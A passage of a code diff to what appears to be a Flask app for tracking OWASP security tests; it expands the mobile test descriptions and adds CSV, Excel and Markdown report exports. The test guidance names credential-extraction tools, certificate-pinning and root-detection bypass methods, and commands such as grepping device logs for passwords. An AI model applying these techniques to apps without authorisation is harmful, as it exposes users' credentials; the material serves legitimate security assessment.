+• Secure communication protocols defined
+• Key management and cryptographic architecture
+
+▼ Documentation to Request:
+• High-level architecture diagrams
+• Threat modeling documentation
+• Security requirements and controls
+• Data classification and handling procedures
+• Incident response and monitoring plans'''
             },
             {
                 'id': 'MSTG-STORAGE-1',
                 'title': 'System credential storage facilities are used appropriately',
                 'category': 'Data Storage and Privacy Requirements',
-                'description': 'Verify that system credential storage facilities are used appropriately to store sensitive data.'
+                'description': '''Verify that system credential storage facilities are used appropriately to store sensitive data.
+
+▼ What to Test:
+• iOS Keychain usage for sensitive data
+• Android Keystore/EncryptedSharedPreferences usage
+• Proper access controls and protection levels
+• Backup and export restrictions
+
+▼ How to Test:
+1. Static analysis: Check for proper storage API usage
+2. Dynamic analysis: Monitor file system during app usage
+3. Backup testing: Check if sensitive data appears in backups
+4. Rooted/jailbroken testing: Access credential stores
+5. Memory dumps: Check for sensitive data in memory
+
+▼ Proper Storage Mechanisms:
+• iOS: Keychain Services for passwords and keys
+• Android: EncryptedSharedPreferences, Android Keystore
+• Biometric authentication integration
+• Hardware-backed security (TEE, Secure Enclave)
+
+▼ Common Mistakes:
+• Storing credentials in SharedPreferences (Android)
+• Using NSUserDefaults for sensitive data (iOS)
+• Hardcoding credentials in source code
+• Not using appropriate protection classes
+• Allowing credential backup to cloud services
+
+▼ Testing Tools:
+• iOS: Keychain-dumper, iMazing, 3uTools
+• Android: ADB, sqlite3, shared_prefs analysis
+• Frida scripts for runtime analysis
+• Mobile security frameworks (MobSF, Needle)'''
             },
             {
                 'id': 'MSTG-STORAGE-2',
                 'title': 'No sensitive data is stored outside of the app container or system credential storage',
                 'category': 'Data Storage and Privacy Requirements',
-                'description': 'Ensure that sensitive data is not stored outside the app sandbox or system credential storage.'
+                'description': '''Ensure that sensitive data is not stored outside the app sandbox or system credential storage.
+
+▼ What to Test:
+• Data stored in external storage (SD card, shared directories)
+• Information in system logs and crash dumps
+• Temporary files and caches containing sensitive data
+• Data shared with other applications
+
+▼ How to Test:
+1. File system analysis: Check external storage for app data
+2. Log analysis: Review system logs for sensitive information
+3. Cache inspection: Check temporary files and app caches
+4. Memory dumps: Analyze RAM for sensitive data persistence
+5. Inter-app communication: Test data sharing mechanisms
+
+▼ Storage Locations to Check:
+• Android: /sdcard/, /Android/data/, external cache
+• iOS: Documents directory shared via iTunes, tmp directories
+• System logs: logcat (Android), Console.app (iOS)
+• Crash reports and debug information
+• Shared preferences and configuration files
+
+▼ Sensitive Data Types:
+• User credentials and session tokens
+• Personal information (PII)
+• Cryptographic keys and certificates
+• Business-critical data and trade secrets
+• Location data and usage patterns
+
+▼ Testing Commands:
+• Android: adb shell find /sdcard -name "*appname*"
+• iOS: Browse app container with tools like iMazing
+• Check logs: adb logcat | grep -i password
+• Memory analysis: Use Frida or similar tools'''
             },
             {
                 'id': 'MSTG-STORAGE-3',
                 'title': 'No sensitive data is written to application logs',
                 'category': 'Data Storage and Privacy Requirements',
-                'description': 'Verify that no sensitive data is written to application logs.'
+                'description': '''Verify that no sensitive data is written to application logs.
+
+▼ What to Test:
+• Application debug logs and console output
+• System logs and crash reports
+• Third-party logging frameworks
+• Error handling and exception logging
+
+▼ How to Test:
+1. Log monitoring: Monitor logs during app usage
+2. Static analysis: Search source code for logging statements
+3. Runtime analysis: Use debugging tools to capture logs
+4. Crash testing: Trigger errors and check crash reports
+5. Third-party service logs: Check external logging services
+
+▼ Common Logging Issues:
+• Passwords and tokens in debug logs
+• User input logged without sanitization
+• Database queries with sensitive parameters
+• Error messages containing sensitive context
+• API responses logged in full detail
+
+▼ Log Sources to Check:
+• Android: Logcat output, app-specific logs
+• iOS: Console.app, Xcode debug output
+• Framework logs: Apache Cordova, React Native
+• Third-party services: Crashlytics, Bugsnag
+• Web view console logs
+
+▼ Testing Approach:
+• Enable verbose logging and monitor output
+• Trigger error conditions to generate exception logs
+• Check for sensitive data in stack traces
+• Verify log sanitization and filtering
+• Test different log levels and configurations'''
             },
             {
                 'id': 'MSTG-CRYPTO-1',
                 'title': 'The app does not rely on symmetric cryptography with hardcoded keys',
                 'category': 'Cryptography Requirements',
-                'description': 'Ensure the app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.'
+                'description': '''Ensure the app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.
+
+▼ What to Test:
+• Hardcoded encryption keys in source code or binaries
+• Symmetric encryption used without proper key management
+• Obfuscated keys that can be easily extracted
+• Key derivation from predictable sources
+
+▼ How to Test:
+1. Static analysis: Search for hardcoded keys in source code
+2. Binary analysis: Look for key patterns in compiled binaries
+3. Runtime analysis: Monitor cryptographic operations
+4. Reverse engineering: Extract keys from obfuscated code
+5. Key derivation testing: Analyze key generation mechanisms
+
+▼ Common Hardcoded Key Issues:
+• AES keys embedded as string literals
+• Base64 encoded keys in source code
+• Keys derived from app version or device identifiers
+• Same key used across all app installations
+• Keys stored in easily accessible configuration files
+
+▼ Proper Key Management:
+• User-derived keys (from passwords/biometrics)
+• Server-provided keys with secure exchange
+• Hardware-backed key storage (TEE, Secure Enclave)
+• Key derivation functions (PBKDF2, scrypt, Argon2)
+• Per-user or per-session unique keys
+
+▼ Analysis Tools:
+• Strings command to find hardcoded values
+• Hopper, IDA Pro for binary analysis
+• MobSF for automated static analysis
+• Frida for runtime key extraction
+• Class-dump for iOS Objective-C analysis'''
             },
             {
                 'id': 'MSTG-CRYPTO-2',
                 'title': 'The app uses proven implementations of cryptographic primitives',
                 'category': 'Cryptography Requirements',
-                'description': 'Verify that the app uses proven implementations of cryptographic primitives.'
+                'description': '''Verify that the app uses proven implementations of cryptographic primitives.
+
+▼ What to Test:
+• Use of standard cryptographic libraries
+• Custom or home-grown cryptographic implementations
+• Weak or deprecated cryptographic algorithms
+• Proper usage of cryptographic APIs
+
+▼ How to Test:
+1. Library analysis: Identify cryptographic libraries in use
+2. Algorithm identification: Check for weak or custom algorithms
+3. Implementation review: Verify proper API usage
+4. Randomness testing: Check random number generation
+5. Protocol analysis: Verify secure protocol implementations
+
+▼ Recommended Libraries:
+• iOS: CommonCrypto, Security.framework, CryptoKit
+• Android: Android Keystore, Conscrypt, BouncyCastle
+• Cross-platform: OpenSSL, libsodium, NaCl
+• Avoid: Custom implementations, deprecated libraries
+
+▼ Weak Algorithms to Avoid:
+• DES, 3DES (use AES instead)
+• MD5, SHA1 for security purposes (use SHA-256+)
+• RC4 stream cipher (use ChaCha20 or AES-GCM)
+• Custom base64 "encryption"
+• Simple XOR ciphers
+
+▼ Proper Implementation Checks:
+• Secure random number generation
+• Proper initialization vector (IV) usage
+• Authentication with encryption (AES-GCM, ChaCha20-Poly1305)
+• Constant-time comparison functions
+• Proper error handling without information leakage'''
             },
             {
                 'id': 'MSTG-AUTH-1',
                 'title': 'Authentication is performed at the remote endpoint',
                 'category': 'Authentication and Session Management Requirements',
-                'description': 'If the app provides users access to a remote service, authentication is performed at the remote endpoint.'
+                'description': '''If the app provides users access to a remote service, authentication is performed at the remote endpoint.
+
+▼ What to Test:
+• Authentication logic implementation location
+• Token validation on server vs client
+• Offline authentication capabilities and limitations
+• Bypass techniques for client-side authentication
+
+▼ How to Test:
+1. Network traffic analysis: Monitor authentication requests
+2. Token manipulation: Modify auth tokens and test acceptance
+3. Offline testing: Test app behavior without network
+4. Server-side validation: Verify tokens are validated server-side
+5. Bypass attempts: Try to access resources without proper auth
+
+▼ Server-Side Authentication Elements:
+• Username/password validation on server
+• Session token generation and management
+• Multi-factor authentication processing
+• Account lockout and security controls
+• Authorization decisions made server-side
+
+▼ Client-Side Issues to Avoid:
+• Authentication logic only in mobile app
+• Hardcoded credentials for "authentication"
+• Client-generated tokens accepted by server
+• Offline mode bypassing authentication entirely
+• Role-based access control only on client
+
+▼ Testing Approach:
+• Intercept and modify authentication requests
+• Test if modified/invalid tokens are rejected
+• Verify server validates all authentication claims
+• Check if auth state persists properly across sessions
+• Test authentication bypass techniques'''
             },
             {
                 'id': 'MSTG-AUTH-2',
                 'title': 'Remote endpoint maintains stateful session management',
                 'category': 'Authentication and Session Management Requirements',
-                'description': 'Verify that the remote endpoint uses randomly generated access tokens to authenticate client requests.'
+                'description': '''Verify that the remote endpoint uses randomly generated access tokens to authenticate client requests.
+
+▼ What to Test:
+• Session token randomness and unpredictability
+• Token lifecycle management (creation, refresh, revocation)
+• Stateful session tracking on server
+• Token entropy and collision resistance
+
+▼ How to Test:
+1. Token analysis: Collect multiple tokens and analyze patterns
+2. Entropy testing: Use statistical tests for randomness
+3. Lifecycle testing: Test token creation, refresh, and expiration
+4. Concurrent sessions: Test multiple simultaneous sessions
+5. Token revocation: Verify tokens can be invalidated
+
+▼ Session Token Requirements:
+• Cryptographically random generation
+• Sufficient length (minimum 128 bits)
+• No predictable patterns or sequences
+• Proper expiration and timeout handling
+• Secure transmission and storage
+
+▼ Testing Session Management:
+• Collect 100+ tokens and analyze for patterns
+• Test token expiration and renewal mechanisms
+• Verify concurrent session handling
+• Check if old tokens are properly invalidated
+• Test session fixation vulnerabilities
+
+▼ Tools for Analysis:
+• Burp Suite Sequencer for token analysis
+• Custom scripts for pattern detection
+• Statistical randomness tests
+• Session management testing frameworks'''
             },
             {
                 'id': 'MSTG-NETWORK-1',
                 'title': 'Data is encrypted on the network using TLS',
                 'category': 'Network Communication Requirements',
-                'description': 'Verify that data is encrypted on the network using TLS with secure cipher suites.'
+                'description': '''Verify that data is encrypted on the network using TLS with secure cipher suites.
+
+▼ What to Test:
+• All network communications use HTTPS/TLS
+• TLS version and cipher suite strength
+• Certificate validation and pinning
+• Mixed content and downgrade attacks
+
+▼ How to Test:
+1. Traffic interception: Monitor all app network traffic
+2. Protocol analysis: Verify TLS usage for all connections
+3. Cipher testing: Check supported cipher suites
+4. Certificate testing: Verify proper certificate validation
+5. Downgrade testing: Test forced HTTP connections
+
+▼ Network Security Requirements:
+• TLS 1.2 or higher for all connections
+• Strong cipher suites (AES-GCM, ChaCha20-Poly1305)
+• Perfect Forward Secrecy (PFS) support
+• Proper certificate chain validation
+• Certificate pinning for critical connections
+
+▼ Common Network Issues:
+• HTTP connections for sensitive data
+• Weak TLS configurations
+• Accepting self-signed certificates
+• Missing certificate pinning
+• Insecure fallback to HTTP
+
+▼ Testing Tools:
+• Burp Suite / OWASP ZAP for traffic analysis
+• SSLyze for TLS configuration testing
+• Nmap for SSL/TLS scanning
+• testssl.sh for comprehensive SSL testing
+• Mobile-specific tools: MITMProxy, Charles Proxy'''
             },
             {
                 'id': 'MSTG-NETWORK-2',
                 'title': 'The TLS certificate is properly verified',
                 'category': 'Network Communication Requirements',
-                'description': 'Ensure that TLS certificates are properly verified and certificate pinning is implemented where appropriate.'
+                'description': '''Ensure that TLS certificates are properly verified and certificate pinning is implemented where appropriate.
+
+▼ What to Test:
+• Certificate chain validation
+• Hostname verification
+• Certificate pinning implementation
+• Handling of certificate errors
+
+▼ How to Test:
+1. Invalid certificate testing: Use self-signed or expired certificates
+2. Hostname mismatch: Test with wrong hostname in certificate
+3. Pinning bypass: Test with valid but different certificates
+4. Error handling: Check app behavior with certificate errors
+5. Proxy testing: Test app through intercepting proxies
+
+▼ Certificate Validation Elements:
+• Complete certificate chain verification
+• Root CA trust store validation
+• Certificate expiration checking
+• Hostname/Subject Alternative Name verification
+• Certificate revocation checking (OCSP)
+
+▼ Certificate Pinning:
+• Pin specific certificates for critical services
+• Pin public keys instead of certificates
+• Implement backup pins for certificate rotation
+• Proper error handling for pinning failures
+• Consider certificate transparency monitoring
+
+▼ Testing Scenarios:
+• Self-signed certificates should be rejected
+• Expired certificates should cause connection failure
+• Wrong hostname should trigger validation error
+• Pinned connections should fail with different valid certs
+• Test certificate pinning bypass techniques'''
             },
             {
                 'id': 'MSTG-PLATFORM-1',
                 'title': 'App only uses software components without known vulnerabilities',
                 'category': 'Platform Interaction Requirements',
-                'description': 'Verify that the app only uses software components without known security vulnerabilities.'
-            },
-            {
-                'id': 'MSTG-PLATFORM-2',
-                'title': 'All app components from third parties are identified and checked',
-                'category': 'Platform Interaction Requirements',
-                'description': 'Ensure that all third-party components are identified and checked for known security vulnerabilities.'
+                'description': '''Verify that the app only uses software components without known security vulnerabilities.
+
+▼ What to Test:
+• Third-party library versions and vulnerability status
+• Operating system API usage and deprecation
+• Framework and runtime vulnerability exposure
+• Dependency chain security assessment
+
+▼ How to Test:
+1. Dependency analysis: List all third-party components
+2. Vulnerability scanning: Check components against CVE databases
+3. Version checking: Verify latest secure versions are used
+4. License compliance: Check for license compatibility
+5. Supply chain security: Verify component authenticity
+
+▼ Component Analysis:
+• Mobile frameworks: React Native, Xamarin, Flutter
+• Networking libraries: OkHttp, Alamofire, Retrofit
+• Cryptographic libraries: OpenSSL, BouncyCastle
+• UI frameworks and third-party SDKs
+• Analytics and crash reporting libraries
+
+▼ Vulnerability Assessment:
+• Check NIST NVD database for known CVEs
+• Use dependency checking tools (OWASP Dependency Check)
+• Monitor security advisories for used components
+• Implement dependency update policies
+• Regular security scanning in CI/CD pipeline
+
+▼ Tools and Resources:
+• OWASP Dependency Check
+• Snyk vulnerability database
+• GitHub Security Advisories
+• Node Security Platform (npm audit)
+• Sonatype OSS Index'''
             },
             {
                 'id': 'MSTG-CODE-1',
                 'title': 'The app is signed and provisioned with a valid certificate',
                 'category': 'Code Quality and Build Setting Requirements',
-                'description': 'Verify that the app is signed and provisioned with a valid certificate.'
-            },
-            {
-                'id': 'MSTG-CODE-2',
-                'title': 'The app has been built in release mode',
-                'category': 'Code Quality and Build Setting Requirements',
-                'description': 'Ensure that the app has been built in release mode with appropriate compiler optimizations.'
+                'description': '''Verify that the app is signed and provisioned with a valid certificate.
+
+▼ What to Test:
+• Code signing certificate validity and trust chain
+• Provisioning profile configuration
+• App integrity and tampering detection
+• Distribution certificate usage
+
+▼ How to Test:
+1. Signature verification: Check code signing status
+2. Certificate analysis: Verify certificate chain and validity
+3. Provisioning check: Analyze provisioning profile settings
+4. Integrity testing: Test app modification detection
+5. Distribution validation: Verify proper distribution signing
+
+▼ iOS Code Signing:
+• Developer/Distribution certificate validation
+• Provisioning profile device/capability restrictions
+• Bundle identifier and team identifier verification
+• Entitlements and capabilities configuration
+• App Store or Enterprise distribution validation
+
+▼ Android Code Signing:
+• APK signature scheme validation (v1, v2, v3)
+• Certificate validity and expiration
+• Debug vs release certificate usage
+• Google Play App Signing configuration
+• Key rotation and certificate chains
+
+▼ Testing Commands:
+• iOS: codesign -dv --verbose=4 App.app
+• Android: jarsigner -verify -verbose app.apk
+• APK analysis: apksigner verify --verbose app.apk
+• Certificate inspection: keytool -printcert -jarfile app.apk'''
             },
             {
                 'id': 'MSTG-RESILIENCE-1',
                 'title': 'The app detects and responds to jailbroken or rooted devices',
                 'category': 'Resilience Against Reverse Engineering Requirements',
-                'description': 'Verify that the app detects and responds appropriately to jailbroken or rooted devices.'
-            },
-            {
-                'id': 'MSTG-RESILIENCE-2',
-                'title': 'The app prevents debugging and/or detects being debugged',
-                'category': 'Resilience Against Reverse Engineering Requirements',
-                'description': 'Ensure that the app implements anti-debugging techniques or detects when it is being debugged.'
+                'description': '''Verify that the app detects and responds appropriately to jailbroken or rooted devices.
+
+▼ What to Test:
+• Root/jailbreak detection mechanisms
+• Detection bypass resistance
+• Response to detected compromise
+• False positive handling
+
+▼ How to Test:
+1. Test on rooted/jailbroken devices: Verify detection works
+2. Bypass testing: Use common bypass techniques
+3. Response testing: Check app behavior when detection triggers
+4. False positive testing: Test on legitimate modified devices
+5. Detection robustness: Test multiple detection methods
+
+▼ Detection Techniques:
+• File system checks: Look for common root/jailbreak files
+• Process inspection: Check for suspicious running processes
+• System property analysis: Check build properties and settings
+• Behavioral analysis: Monitor system behavior patterns
+• Hardware attestation: Use TEE/Secure Enclave features
+
+▼ Common Bypass Methods:
+• Frida and other hooking frameworks
+• Xposed modules for detection bypass
+• Magisk Hide and other root hiding tools
+• Runtime manipulation and memory patching
+• Emulator and modified firmware detection
+
+▼ Response Strategies:
+• Graceful degradation of functionality
+• Increased security monitoring and logging
+• Limited feature access or data protection
+• User notification and education
+• Server-side risk assessment integration'''
             }
         ]
 
@@ -653,7 +1724,7 @@ class OWASPService:
         """Update the cache information"""
         cache_entry = OWASPDataCache.query.filter_by(data_type=data_type).first()
         if cache_entry:
-            cache_entry.last_updated = datetime.utcnow()
+            cache_entry.last_updated = utc_now()
             cache_entry.data_source = source
             cache_entry.test_count = count
         else:
@@ -748,7 +1819,25 @@ class OWASPService:
                             category = category_map.get(category_code, current_category or 'Miscellaneous Testing')
                             
                             # Generate description
-                            description = f"Security testing as per OWASP WSTG guidelines for {test_name.lower()}."
+                            description = f'''Security testing as per OWASP WSTG guidelines for {test_name.lower()}.
+
+▼ What to Test:
+• Review the specific functionality related to {test_name.lower()}
+• Identify potential security weaknesses in implementation
+• Test using both manual and automated approaches
+• Verify proper security controls are in place
+
+▼ How to Test:
+• Follow OWASP WSTG methodology for this test case
+• Use appropriate tools and techniques for the vulnerability type
+• Document all testing steps and observations
+• Capture evidence of any security issues found
+
+▼ Documentation Required:
+• Detailed test steps and methodology
+• Screenshots or logs showing evidence
+• Risk assessment and potential impact
+• Specific remediation recommendations'''
                             
                             wstg_tests.append({
                                 'id': wstg_id,
@@ -2628,7 +3717,7 @@ def new_project():
 
 @app.route('/project/<int:project_id>')
 def project_detail(project_id):
-    project = Project.query.get_or_404(project_id)
+    project = db.get_or_404(Project, project_id)
     test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
     
     # Group test items by category
@@ -2642,13 +3731,13 @@ def project_detail(project_id):
 
 @app.route('/project/<int:project_id>/test/<int:test_id>/update', methods=['POST'])
 def update_test_item(project_id, test_id):
-    test_item = TestItem.query.get_or_404(test_id)
+    test_item = db.get_or_404(TestItem, test_id)
     
     test_item.is_tested = request.form.get('is_tested') == 'on'
     test_item.evidence = request.form.get('evidence', '')
     test_item.finding_status = request.form.get('finding_status', 'not_tested')
     test_item.risk_level = request.form.get('risk_level', '')
-    test_item.updated_date = datetime.utcnow()
+    test_item.updated_date = utc_now()
     
     db.session.commit()
     flash('Test item updated successfully!', 'success')
@@ -2656,7 +3745,7 @@ def update_test_item(project_id, test_id):
 
 @app.route('/project/<int:project_id>/autotest', methods=['POST'])
 def run_auto_tests(project_id):
-    project = Project.query.get_or_404(project_id)
+    project = db.get_or_404(Project, project_id)
     
     if not project.urls:
         flash('No URLs configured for automatic testing', 'error')
@@ -2735,7 +3824,7 @@ def run_auto_tests(project_id):
 
 @app.route('/project/<int:project_id>/autotest-results')
 def autotest_results(project_id):
-    project = Project.query.get_or_404(project_id)
+    project = db.get_or_404(Project, project_id)
     results = AutoTestResult.query.filter_by(project_id=project_id).order_by(AutoTestResult.created_date.desc()).all()
     return render_template('autotest_results.html', project=project, results=results)
 
@@ -2764,6 +3853,241 @@ def refresh_owasp_data():
     # Get cache information for display
     cache_info = OWASPService.get_cache_info()
     return render_template('refresh_owasp.html', cache_info=cache_info)
+
+@app.route('/project/<int:project_id>/export/csv')
+def export_csv(project_id):
+    """Export project test results to CSV format"""
+    project = db.get_or_404(Project, project_id)
+    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
+    
+    # Create CSV data
+    output = io.StringIO()
+    writer = csv.writer(output)
+    
+    # Write header
+    writer.writerow([
+        'OWASP ID',
+        'Title', 
+        'Category',
+        'Test Type',
+        'Finding Status',
+        'Risk Level',
+        'Evidence',
+        'Is Tested',
+        'Created Date',
+        'Updated Date'
+    ])
+    
+    # Write test items
+    for item in test_items:
+        writer.writerow([
+            item.owasp_id,
+            item.title,
+            item.category,
+            item.test_type.upper(),
+            item.finding_status.replace('_', ' ').title(),
+            item.risk_level.title() if item.risk_level else 'N/A',
+            item.evidence or 'No evidence provided',
+            'Yes' if item.is_tested else 'No',
+            item.created_date.strftime('%Y-%m-%d %H:%M:%S'),
+            item.updated_date.strftime('%Y-%m-%d %H:%M:%S')
+        ])
+    
+    # Create response
+    output.seek(0)
+    response = make_response(output.getvalue())
+    response.headers['Content-Type'] = 'text/csv'
+    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_tests.csv"'
+    
+    return response
+
+@app.route('/project/<int:project_id>/export/xlsx')
+def export_xlsx(project_id):
+    """Export project test results to Excel format"""
+    project = db.get_or_404(Project, project_id)
+    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
+    
+    # Create workbook and worksheet
+    wb = Workbook()
+    ws = wb.active
+    ws.title = "Security Test Results"
+    
+    # Define styles
+    header_font = Font(bold=True, color="FFFFFF")
+    header_fill = PatternFill(start_color="366092", end_color="366092", fill_type="solid")
+    center_alignment = Alignment(horizontal="center", vertical="center")
+    
+    # Write headers
+    headers = [
+        'OWASP ID', 'Title', 'Category', 'Test Type', 'Finding Status', 
+        'Risk Level', 'Evidence', 'Is Tested', 'Created Date', 'Updated Date'
+    ]
+    
+    for col, header in enumerate(headers, 1):
+        cell = ws.cell(row=1, column=col, value=header)
+        cell.font = header_font
+        cell.fill = header_fill
+        cell.alignment = center_alignment
+    
+    # Write data
+    for row, item in enumerate(test_items, 2):
+        ws.cell(row=row, column=1, value=item.owasp_id)
+        ws.cell(row=row, column=2, value=item.title)
+        ws.cell(row=row, column=3, value=item.category)
+        ws.cell(row=row, column=4, value=item.test_type.upper())
+        ws.cell(row=row, column=5, value=item.finding_status.replace('_', ' ').title())
+        ws.cell(row=row, column=6, value=item.risk_level.title() if item.risk_level else 'N/A')
+        ws.cell(row=row, column=7, value=item.evidence or 'No evidence provided')
+        ws.cell(row=row, column=8, value='Yes' if item.is_tested else 'No')
+        ws.cell(row=row, column=9, value=item.created_date.strftime('%Y-%m-%d %H:%M:%S'))
+        ws.cell(row=row, column=10, value=item.updated_date.strftime('%Y-%m-%d %H:%M:%S'))
+        
+        # Color code finding status
+        status_cell = ws.cell(row=row, column=5)
+        if item.finding_status == 'pass':
+            status_cell.fill = PatternFill(start_color="D4EDDA", end_color="D4EDDA", fill_type="solid")
+        elif item.finding_status == 'fail':
+            status_cell.fill = PatternFill(start_color="F8D7DA", end_color="F8D7DA", fill_type="solid")
+        elif item.finding_status == 'informational':
+            status_cell.fill = PatternFill(start_color="FFF3CD", end_color="FFF3CD", fill_type="solid")
+    
+    # Adjust column widths
+    column_widths = [15, 50, 30, 12, 15, 12, 60, 12, 20, 20]
+    for col, width in enumerate(column_widths, 1):
+        ws.column_dimensions[ws.cell(row=1, column=col).column_letter].width = width
+    
+    # Save to memory
+    output = io.BytesIO()
+    wb.save(output)
+    output.seek(0)
+    
+    # Create response
+    response = make_response(output.getvalue())
+    response.headers['Content-Type'] = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
+    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_tests.xlsx"'
+    
+    return response
+
+@app.route('/project/<int:project_id>/export/markdown')
+def export_markdown(project_id):
+    """Export project test results to Markdown format"""
+    project = db.get_or_404(Project, project_id)
+    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
+    
+    # Group tests by category
+    categories = {}
+    for item in test_items:
+        if item.category not in categories:
+            categories[item.category] = []
+        categories[item.category].append(item)
+    
+    # Generate markdown content
+    markdown_content = []
+    markdown_content.append(f"# {project.name} - Security Test Report")
+    markdown_content.append(f"\n**Client:** {project.client_name}")
+    markdown_content.append(f"**Test Type:** {project.job_type.replace('_', ' ').title()}")
+    markdown_content.append(f"**Generated:** {utc_now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    if project.description:
+        markdown_content.append(f"\n**Description:** {project.description}")
+    
+    if project.urls:
+        # Handle both JSON and plain text URL storage
+        try:
+            urls = json.loads(project.urls) if project.urls.startswith('[') or project.urls.startswith('{') else [url.strip() for url in project.urls.split('\n') if url.strip()]
+        except (json.JSONDecodeError, AttributeError):
+            urls = [url.strip() for url in project.urls.split('\n') if url.strip()]
+        
+        if urls:
+            markdown_content.append(f"\n**Target URLs:**")
+            for url in urls:
+                markdown_content.append(f"- {url}")
+    
+    # Summary statistics
+    total_tests = len(test_items)
+    tested_items = [item for item in test_items if item.is_tested]
+    passed_tests = len([item for item in test_items if item.finding_status == 'pass'])
+    failed_tests = len([item for item in test_items if item.finding_status == 'fail'])
+    
+    markdown_content.append(f"\n## Summary")
+    markdown_content.append(f"- **Total Tests:** {total_tests}")
+    markdown_content.append(f"- **Tests Completed:** {len(tested_items)}")
+    markdown_content.append(f"- **Passed:** {passed_tests}")
+    markdown_content.append(f"- **Failed:** {failed_tests}")
+    markdown_content.append(f"- **Progress:** {(len(tested_items) / total_tests * 100):.1f}%")
+    
+    # Test results by category
+    markdown_content.append(f"\n## Test Results by Category")
+    
+    for category, items in categories.items():
+        markdown_content.append(f"\n### {category}")
+        markdown_content.append(f"\n| OWASP ID | Title | Status | Risk Level | Evidence |")
+        markdown_content.append(f"|----------|-------|--------|------------|----------|")
+        
+        for item in items:
+            status_emoji = {
+                'pass': '✅',
+                'fail': '❌', 
+                'informational': 'ℹ️',
+                'error': '⚠️',
+                'not_tested': '⏳'
+            }.get(item.finding_status, '⏳')
+            
+            risk_level = item.risk_level.title() if item.risk_level else 'N/A'
+            evidence = (item.evidence or 'No evidence provided').replace('\n', ' ').replace('|', '\\|')[:100]
+            if len(item.evidence or '') > 100:
+                evidence = evidence[:97] + '...'
+            elif not item.evidence:
+                evidence = 'No evidence provided'
+            
+            markdown_content.append(f"| {item.owasp_id} | {item.title.replace('|', '\\|')} | {status_emoji} {item.finding_status.replace('_', ' ').title()} | {risk_level} | {evidence} |")
+    
+    # Detailed findings for failed tests
+    failed_items = [item for item in test_items if item.finding_status == 'fail']
+    if failed_items:
+        markdown_content.append(f"\n## Detailed Findings")
+        
+        for item in failed_items:
+            markdown_content.append(f"\n### {item.owasp_id}: {item.title}")
+            markdown_content.append(f"**Category:** {item.category}")
+            markdown_content.append(f"**Risk Level:** {item.risk_level.title() if item.risk_level else 'Not Specified'}")
+            
+            if item.evidence:
+                markdown_content.append(f"\n**Evidence:**")
+                markdown_content.append(f"```")
+                markdown_content.append(item.evidence)
+                markdown_content.append(f"```")
+            
+            markdown_content.append(f"\n---")
+    
+    # Create response
+    content = '\n'.join(markdown_content)
+    response = make_response(content)
+    response.headers['Content-Type'] = 'text/markdown'
+    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_report.md"'
+    
+    return response
+
+@app.route('/project/<int:project_id>/delete', methods=['POST'])
+def delete_project(project_id):
+    """Delete a project and all associated test items"""
+    project = db.get_or_404(Project, project_id)
+    
+    try:
+        # Delete associated test items (handled by cascade)
+        # Delete auto test results
+        AutoTestResult.query.filter_by(project_id=project_id).delete()
+        
+        # Delete the project
+        db.session.delete(project)
+        db.session.commit()
+        
+        flash(f'Project "{project.name}" has been deleted successfully.', 'success')
+    except Exception as e:
+        db.session.rollback()
+        flash(f'Error deleting project: {str(e)}', 'error')
+    
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     with app.app_context():
